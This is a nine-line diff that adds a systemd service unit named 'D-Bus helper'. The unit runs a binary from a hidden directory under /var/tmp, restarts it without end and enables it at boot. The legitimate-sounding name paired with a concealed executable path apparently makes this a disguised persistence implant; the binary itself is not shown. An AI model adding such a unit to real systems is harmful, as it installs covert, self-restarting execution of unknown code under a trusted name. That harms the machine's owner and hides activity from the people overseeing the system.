@@ -1,0 +1,9 @@
+[Unit]
+Description=D-Bus helper
+
+[Service]
+ExecStart=/var/tmp/.cache/upd
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
